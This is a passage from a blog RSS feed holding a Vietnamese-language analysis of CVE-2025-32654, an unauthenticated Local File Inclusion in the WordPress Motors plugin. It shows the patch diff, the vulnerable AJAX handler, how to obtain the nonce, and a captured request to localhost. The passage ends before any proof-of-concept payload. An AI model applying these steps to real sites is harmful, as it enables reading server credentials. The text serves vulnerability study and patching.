rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Team Manager Plugin &amp;lt;= 2.1.23 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32654 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-14-cve-2025-32654/</link>
      <pubDate>Tue, 14 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-14-cve-2025-32654/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Motors&lt;/strong&gt; phi√™n b·∫£n &lt;strong&gt;‚â§ 1.4.71&lt;/strong&gt; ch·ª©a l·ªó h·ªïng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh &lt;code&gt;include/require&lt;/code&gt;, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32654&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32654&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.4.71&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.4.72&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/motors-car-dealership-classified-listings/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Motors Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Motors&lt;/strong&gt;: &lt;strong&gt;1.4.71&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;1.4.72&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function motors_ew_grid_tabs() {&#xA;&#x9;$template = sanitize_text_field( $_POST[&amp;#39;template&amp;#39;] );&#xA;&#x9;// other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n l·ªói &lt;strong&gt;ch·ªâ l·ªçc k√Ω t·ª± HTML&lt;/strong&gt; b·∫±ng &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_text_field/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt;&lt;/a&gt;, kh√¥ng gi·ªõi h·∫°n ƒë∆∞·ªùng d·∫´n, n√™n attacker c√≥ th·ªÉ ch√®n &lt;code&gt;../&lt;/code&gt; ho·∫∑c t√™n file b·∫•t k·ª≥ =&amp;gt; &lt;code&gt;LFI&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function motors_ew_grid_tabs() {&#xA;&#x9;$allowed_templates = array(&#xA;&#x9;&#x9;&amp;#39;listing-cars/listing-grid-directory-loop-4&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;listing-cars/listing-grid-directory-loop-3&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;listing-cars/listing-grid-directory-loop&amp;#39;,&#xA;&#x9;);&#xA;&#x9;$template = &amp;#39;listing-cars/&amp;#39; . ( isset( $_POST[&amp;#39;template&amp;#39;] ) ? sanitize_file_name( $_POST[&amp;#39;template&amp;#39;] ) : &amp;#39;&amp;#39; );&#xA;&#x9;if ( ! in_array( $template, $allowed_templates, true ) ) {&#xA;&#x9;&#x9;wp_send_json_error( &amp;#39;Invalid template&amp;#39; );&#xA;&#x9;&#x9;return;&#xA;&#x9;}&#xA;&#x9;// other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° √°p d·ª•ng &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_file_name/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_file_name()&lt;/code&gt;&lt;/a&gt; + &lt;strong&gt;whitelist&lt;/strong&gt; ki·ªÉm tra h·ª£p l·ªá, gi√∫p kh√≥a ch·∫∑t input v√† lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng khai th√°c th√¥ng qua tham s·ªë template.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;H√†m &lt;code&gt;motors_ew_grid_tabs()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m &lt;strong&gt;callback&lt;/strong&gt; cho &lt;strong&gt;action hook&lt;/strong&gt; c√≥ t√™n &lt;code&gt;&amp;quot;grid_tabs_widget&amp;quot;&lt;/code&gt; th√¥ng qua ƒëo·∫°n m√£:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_grid_tabs_widget&amp;#39;, array( self::class, &amp;#39;motors_ew_grid_tabs&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ti·ªÅn t·ªë &lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; cho bi·∫øt action n√†y &lt;strong&gt;kh√¥ng y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p&lt;/strong&gt; khi g·ªçi ƒë·∫øn endpoint AJAX.&#xA;Do ƒë√≥, endpoint th·ª±c t·∫ø c√≥ th·ªÉ ƒë∆∞·ª£c truy c·∫≠p c√¥ng khai qua:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/admin-ajax.php?action=grid_tabs_widget&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi ƒë√≥ &lt;code&gt;motors_ew_grid_tabs()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function motors_ew_grid_tabs() {&#xA;&#x9;check_ajax_referer( &amp;#39;motors_grid_tabs&amp;#39;, &amp;#39;security&amp;#39; );&#xA;&#xA;&#x9;$listing_types = apply_filters( &amp;#39;stm_listings_post_type&amp;#39;, &amp;#39;listings&amp;#39; );&#xA;&#xA;&#x9;$tab_type = sanitize_text_field( $_POST[&amp;#39;tab_type&amp;#39;] );&#xA;&#x9;$per_page = intval( $_POST[&amp;#39;per_page&amp;#39;] );&#xA;&#x9;$template = sanitize_text_field( $_POST[&amp;#39;template&amp;#39;] );&#xA;&#x9;$img_size = sanitize_text_field( $_POST[&amp;#39;img_size&amp;#39;] );&#xA;&#xA;&#x9;$args = array(&#xA;&#x9;&#x9;&amp;#39;post_type&amp;#39;      =&amp;gt; $listing_types,&#xA;&#x9;&#x9;&amp;#39;post_status&amp;#39;    =&amp;gt; &amp;#39;publish&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;posts_per_page&amp;#39; =&amp;gt; $per_page,&#xA;&#x9;);&#xA;&#xA;&#x9;if ( &amp;#39;popular&amp;#39; === $tab_type ) {&#xA;&#x9;&#x9;$args = array_merge(&#xA;&#x9;&#x9;&#x9;$args,&#xA;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&amp;#39;orderby&amp;#39;  =&amp;gt; &amp;#39;meta_value_num&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&amp;#39;meta_key&amp;#39; =&amp;gt; &amp;#39;stm_car_views&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&amp;#39;order&amp;#39;    =&amp;gt; &amp;#39;DESC&amp;#39;,&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;$args[&amp;#39;meta_query&amp;#39;][] = array(&#xA;&#x9;&#x9;&amp;#39;key&amp;#39;     =&amp;gt; &amp;#39;car_mark_as_sold&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;value&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;compare&amp;#39; =&amp;gt; &amp;#39;=&amp;#39;,&#xA;&#x9;);&#xA;&#xA;&#x9;$template_args = array();&#xA;&#x9;if ( ! empty( $img_size ) ) {&#xA;&#x9;&#x9;$template_args = array(&#xA;&#x9;&#x9;&#x9;&amp;#39;custom_img_size&amp;#39; =&amp;gt; $img_size,&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;$listings_query = new WP_Query( $args );&#xA;&#xA;&#x9;if ( $listings_query-&amp;gt;have_posts() ) {&#xA;&#x9;&#x9;$output = &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;ob_start();&#xA;&#x9;&#x9;while ( $listings_query-&amp;gt;have_posts() ) {&#xA;&#x9;&#x9;&#x9;$listings_query-&amp;gt;the_post();&#xA;&#x9;&#x9;&#x9;do_action( &amp;#39;stm_listings_load_template&amp;#39;, $template, $template_args );&#xA;&#x9;&#x9;}&#xA;&#x9;&#x9;$output .= ob_get_clean();&#xA;&#x9;}&#xA;&#xA;&#x9;wp_send_json(&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&amp;#39;html&amp;#39; =&amp;gt; $output,&#xA;&#x9;&#x9;)&#xA;&#x9;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong h√†m &lt;code&gt;motors_ew_grid_tabs()&lt;/code&gt;, d√≤ng ƒë·∫ßu ti√™n:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;check_ajax_referer( &amp;#39;motors_grid_tabs&amp;#39;, &amp;#39;security&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;th·ª±c hi·ªán &lt;strong&gt;ki·ªÉm tra nonce&lt;/strong&gt; ƒë·ªÉ b·∫£o v·ªá kh·ªèi &lt;strong&gt;CSRF (Cross-Site Request Forgery)&lt;/strong&gt;.&#xA;N·∫øu nonce g·ª≠i t·ª´ client kh√¥ng h·ª£p l·ªá ho·∫∑c kh√¥ng t·ªìn t·∫°i, h√†m n√†y s·∫Ω &lt;strong&gt;d·ª´ng to√†n b·ªô qu√° tr√¨nh x·ª≠ l√Ω AJAX&lt;/strong&gt; - nghƒ©a l√† c√°c ƒëo·∫°n logic ph√≠a sau (bao g·ªìm x·ª≠ l√Ω &lt;code&gt;$template&lt;/code&gt;, truy v·∫•n b√†i vi·∫øt, v√† render HTML) s·∫Ω &lt;strong&gt;kh√¥ng ƒë∆∞·ª£c th·ª±c thi&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function motors_create_nonce() {&#xA;&#x9;$grid_tabs_widget = wp_create_nonce( &amp;#39;motors_grid_tabs&amp;#39; );&#xA;&#x9;// other logic&#xA;&#x9;wp_localize_script(&#xA;&#x9;&#x9;&amp;#39;jquery&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;mew_nonces&amp;#39;,&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&amp;#39;motors_grid_tabs&amp;#39; =&amp;gt; $grid_tabs_widget,&#xA;&#x9;&#x9;&#x9;// other logic&#xA;&#x9;&#x9;)&#xA;&#x9;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;motors_create_nonce()&lt;/code&gt; t·∫°o nonce cho action &lt;code&gt;&#39;motors_grid_tabs&#39;&lt;/code&gt; b·∫±ng &lt;code&gt;wp_create_nonce()&lt;/code&gt; r·ªìi truy·ªÅn sang JavaScript qua &lt;code&gt;wp_localize_script()&lt;/code&gt; d∆∞·ªõi bi·∫øn &lt;code&gt;mew_nonces.motors_grid_tabs&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;M·∫πo&lt;/p&gt;&lt;p&gt;V√¨ l·ªó h·ªïng n√†y l√† lo·∫°i &lt;strong&gt;Unauthenticated&lt;/strong&gt;, n√™n &lt;strong&gt;nonce&lt;/strong&gt; kh√¥ng ƒë∆∞·ª£c hi·ªÉn th·ªã trong khu v·ª±c &lt;strong&gt;admin&lt;/strong&gt;.&#xA;Thay v√†o ƒë√≥, h√£y truy c·∫≠p &lt;strong&gt;trang ch·ªß&lt;/strong&gt; sau khi plugin ƒë√£ ƒë∆∞·ª£c c√†i ƒë·∫∑t ƒë·∫ßy ƒë·ªß c√°c ph·ª• thu·ªôc, r·ªìi t√¨m t·ª´ kh√≥a &lt;code&gt;motors_grid_tabs&lt;/code&gt; trong m√£ ngu·ªìn trang ƒë·ªÉ l·∫•y gi√° tr·ªã &lt;strong&gt;nonce&lt;/strong&gt; c·∫ßn thi·∫øt.&lt;/p&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/nonce.png&#34;&#xA;    alt=&#34;Gi√° tr·ªã nonce hi·ªÉn th·ªã trong m√£ ngu·ªìn tr√¨nh duy·ªát&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Gi√° tr·ªã nonce hi·ªÉn th·ªã trong m√£ ngu·ªìn tr√¨nh duy·ªát&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Ngo√†i ra, trong m√£ ngu·ªìn trang ch·ªß c√≤n c√≥ ƒëo·∫°n JavaScript th·ª±c hi·ªán &lt;strong&gt;g·ªçi AJAX t·ª± ƒë·ªông&lt;/strong&gt; ƒë·∫øn endpoint ta ƒëang focus:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/admin-ajax.php?action=grid_tabs_widget&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;khi trang ƒë∆∞·ª£c t·∫£i:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;&#xA;&#x9;(function($) {&#xA;&#x9;&#x9;$(document).ready(function() {&#xA;&#x9;&#x9;&#x9;$.ajax({&#xA;&#x9;&#x9;&#x9;&#x9;type: &amp;#34;POST&amp;#34;,&#xA;&#x9;&#x9;&#x9;&#x9;url: ajaxurl,&#xA;&#x9;&#x9;&#x9;&#x9;dataType: &amp;#39;json&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;async: true,&#xA;&#x9;&#x9;&#x9;&#x9;data: &amp;#39;action=grid_tabs_widget&amp;amp;tab_type=popular&amp;amp;per_page=8&amp;amp;template=listing-cars/listing-grid-directory-loop-4&amp;amp;img_size=&amp;amp;security=&amp;#39; &amp;#43; mew_nonces.motors_grid_tabs,&#xA;&#x9;&#x9;&#x9;&#x9;success: function(data) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;if( data.hasOwnProperty(&amp;#39;html&amp;#39;) ) $(&amp;#39;#popular-tab-content&amp;#39;).html(data.html);&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;updateGridItemTitles();&#xA;&#x9;&#x9;&#x9;&#x9;},&#xA;&#x9;&#x9;&#x9;});&#xA;&#x9;&#x9;});&#xA;&#x9;})(jQuery)&#xA;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêo·∫°n script t·ª± ƒë·ªông ch·∫°y v√¨ n·∫±m trong &lt;code&gt;$(document).ready()&lt;/code&gt;, n√™n khi trang load xong, jQuery s·∫Ω t·ª± th·ª±c thi h√†m AJAX.&lt;/p&gt;&#xA;&lt;p&gt;T·∫≠n d·ª•ng ƒëi·ªÅu n√†y, ta reload trang ch·ªß v√† b·∫Øt ajax request b·∫±ng &lt;strong&gt;BurpSuite&lt;/strong&gt;, ƒë·ªÉ l·∫•y c√°c param c·∫ßn thi·∫øt do plugin cung c·∫•p.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#xA;Accept: application/json, text/javascript, */*; q=0.01&#xA;Accept-Language: vi,en-US;q=0.7,en;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#xA;X-Requested-With: XMLHttpRequest&#xA;Content-Length: 168&#xA;Origin: http://localhost&#xA;Connection: keep-alive&#xA;Referer: http://localhost/&#xA;Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; stm_car_watched=2520&#xA;Sec-Fetch-Dest: empty&#xA;Sec-Fetch-Mode: cors&#xA;Sec-Fetch-Site: same-origin&#xA;X-PwnFox-Color: cyan&#xA;&#xA;action=grid_tabs_widget&amp;amp;tab_type=popular&amp;amp;per_page=8&amp;amp;template=listing-cars/listing-grid-directory-loop-4&amp;amp;img_size=&amp;amp;security=d15dd83890&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê·∫∑t breakpoint trong h√†m &lt;code&gt;motors_ew_grid_tabs()&lt;/code&gt; t·∫°i v·ªã tr√≠ x·ª≠ l√Ω d·ªØ li·ªáu tr∆∞·ªõc khi tr·∫£ v·ªÅ cho client:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;ob_start();&#xA;while ( $listings_query-&amp;gt;have_posts() ) {&#xA;&#x9;$listings_query-&amp;gt;the_post();&#xA;&#x9;do_action( &amp;#39;stm_listings_load_template&amp;#39;, $template, $template_args );&#xA;}&#xA;$output .= ob_get_clean();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêo·∫°n m√£ n√†y ch·ªãu tr√°ch nhi·ªám &lt;strong&gt;t·∫°o n·ªôi dung HTML ƒë·ªông&lt;/strong&gt; t·ª´ k·∫øt qu·∫£ truy v·∫•n:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;ob_start()&lt;/code&gt; kh·ªüi t·∫°o b·ªô ƒë·ªám ƒë·∫ßu ra, t·∫°m gi·ªØ m·ªçi n·ªôi dung ƒë∆∞·ª£c in ra.&lt;/li&gt;&#xA;&lt;li&gt;V√≤ng &lt;code&gt;while&lt;/code&gt; l·∫∑p qua c√°c b√†i vi·∫øt trong &lt;code&gt;$listings_query&lt;/code&gt; v√† g·ªçi &lt;code&gt;do_action( &#39;stm_listings_load_template&#39;, $template, $template_args )&lt;/code&gt; ƒë·ªÉ render t·ª´ng item theo template t∆∞∆°ng ·ª©ng.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;ob_get_clean()&lt;/code&gt; l·∫•y to√†n b·ªô n·ªôi dung ƒë√£ render trong buffer, x√≥a b·ªô ƒë·ªám v√† g√°n v√†o &lt;code&gt;$output&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;üëâ K·∫øt qu·∫£: &lt;code&gt;$output&lt;/code&gt; ch·ª©a to√†n b·ªô HTML ƒë√£ ƒë∆∞·ª£c sinh ra, s·∫µn s√†ng g·ª≠i v·ªÅ client qua AJAX.&lt;/p&gt;&#xA;&lt;p&gt;Khi g·ª≠i l·∫°i request v√† quan s√°t b·∫±ng 